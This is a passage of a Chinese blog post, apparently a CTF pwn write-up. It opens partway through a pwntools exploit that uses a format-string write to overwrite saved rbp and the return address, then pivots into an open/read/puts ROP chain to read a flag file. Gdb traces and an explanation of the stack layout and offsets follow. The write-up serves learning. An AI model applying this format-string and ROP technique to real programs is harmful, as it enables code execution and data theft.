<span class="number">0xc8</span></span><br><span class="line">ret = ebp + <span class="number">8</span></span><br><span class="line">pl2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(s1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">pl2+= <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(s2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%11$hhn&#x27;</span></span><br><span class="line">pl2 = pl2.ljust(<span class="number">32</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pl2 += p64(ebp) + p64(ret)</span><br><span class="line">pl2 += p64(ebp+<span class="number">0x80</span>) <span class="comment">#这里是写入弹给rbp的地址。不然会‘吞’掉pop_rdi，导致程序出现问题。</span></span><br><span class="line">pl2 += p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(o)</span><br><span class="line">pl2 += p64(rdx_leave_ret) + p64(<span class="number">0x30</span>) + p64(ebp-<span class="number">0x20</span>) <span class="comment">#这里的地址是弹给rbp的地址。在这一步里rsp=rbp。所以仅仅起到了pop rbp的作用。真是太神奇了。</span></span><br><span class="line">pl2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss)  + p64(r) </span><br><span class="line">pl2 += p64(pop_rdi) + p64(bss) + p64(p) + <span class="string">b&#x27;flag\x00&#x27;</span> </span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
+
+<p>如果单纯只是这么看着exp的话，是一定打不出来的。就算跑通了也是不理解到底是为什么的，也不知道各个增量或者减量到底是为了什么。所以建议要跑本地，因为可以通过gdb调试得到。这里也是通过gdb不断动调的。</p>
+<p>由于程序中缺少我们的orw所需的各种gadget，所以我们可以从libc.so.6中获取。不过由于glibc版本是2.39。所以缺少纯净的pop rdx。所以这里找到的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里的ebp实际指向的是printf函数返回的saved rbp，ret则是存放返回地址的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp -&gt; printf_saved_rbp</span><br><span class="line">ret -&gt; printf_ret</span><br><span class="line">‘rsp’ -&gt; 我们数据输入的开始</span><br></pre></td></tr></table></figure>
+
+<p>那么为什么要改偏移为10和11处的值呢？</p>
+<p>我们可以看一下偏移10和11处，我们都填入了什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6：&#x27;rsp&#x27; :（输入的开始）%&#123;s1&#125;c%10$hn...</span><br><span class="line">7: ...</span><br><span class="line">8: aaaa...</span><br><span class="line">9: aaaa...</span><br><span class="line">10: 0x7fffffffdd80 —▸ 0x7fffffffdd50(ebp) —▸ 0x7fffffffde70 —▸ 0x7fffffffdf10 —▸ 0x7fffffffdf70 ◂— ...</span><br><span class="line">11: 0x7fffffffdd88 —▸ 0x7fffffffdd58(ret) —▸ 0x5555555554af (main+210) ◂— lea rax, [rbp - 0x110]</span><br></pre></td></tr></table></figure>
+
+<p>所以我们去改写了ebp和ret里存放的地址。也就是去改写了<code>0x7fffffffde70</code>和<code>0x5555555554af</code>这两处地址。</p>
+<p>我们来看一下更改写完后变成了什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10: 0x7fffffffdd80 —▸ 0x7fffffffdd50 —▸ 0x7fffffffdd90 —▸ 0x7fffffffddd0 —▸ 0x7fffffffdd30 ◂— ...</span><br><span class="line">11: 0x7fffffffdd88 —▸ 0x7fffffffdd58 —▸ 0x5555555554ec (main+271) ◂— leave </span><br><span class="line">12：0x7fffffffdd90 —▸ 0x7fffffffddd0 —▸ 0x7fffffffdd30 ◂— &#x27;%9$p%41$p%45$p&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们现在来自己分析一下为什么要写到这些地址。很明显的，这里printf返回地址改写为main函数的leave地址是没问题的。</p>
+<p>那么为什么要把printf_saved_rbp改写到<code>0x7fffffffdd90</code>呢？</p>
+<p>由于后面是栈迁移的操作。所以立马会再次进行依次leave；ret。rsp的地址会顺便拉回到rbp处的位置。也就是这里的<code>0x7fffffffdd90</code>。由于下面会pop rbp。所以rsp还会自增8。也就是rsp +&#x3D; 8。那么此时rsp会跳到<code>0x7fffffffdd98</code>。而这里刚好就是我们写入rop链的开头！真是太通畅了。</p>
+<p>至于这里为什么用puts函数，是为了减少rdx_leave_ret指令对栈的影响导致程序崩溃。所以选用了参数更少的puts函数。</p>
+<p>最后需要写入flag头，来作为我们相对路径的开端。然后去计算一下就可以了。比如我们泄露出来的ebp地址是：<code>0x7fffffffdd50</code>，而flag写入的地址是<code>0x7fffffffde18</code>。所以相差的距离就是0xc8。</p>
+<p>真是一道酣畅淋漓的栈布局的题目。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/02/25/Unictf/">http://example.com/2026/02/25/Unictf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/07/Hgame2026/" title="Hgame2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-07</div><div class="info-item-2">Hgame2026</div></div><div class="info-2"><div class="info-item-1">Hgame 2026第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。 1.EZheap真的ez吗？😂快被虐哭了😢其实是自己菜。 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int choice; // [rsp+4h] [rbp-34h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add()...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/25/Unictf/" title="Unictf">Unictf</a><time datetime="2026-02-25T11:07:36.000Z" title="发表于 2026-02-25 19:07:36">2026-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/24/Gets/" title="Gets">Gets</a><time datetime="2026-02-24T07:40:32.000Z" title="发表于 2026-02-24 15:40:32">2026-02-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/23/off-by-null/" title="off_by_null">off_by_null</a><time datetime="2026-02-23T15:22:08.000Z" title="发表于 2026-02-23 23:22:08">2026-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unlink-attack/" title="Unlink_attack">Unlink_attack</a><time datetime="2026-02-19T14:27:22.000Z" title="发表于 2026-02-19 22:27:22">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Double-free/" title="Double_free">Double_free</a><time datetime="2026-02-19T14:26:27.000Z" title="发表于 2026-02-19 22:26:27">2026-02-19</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">7</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.23em; color: #999ea6">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">20</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-02-26T03:32:06.145Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
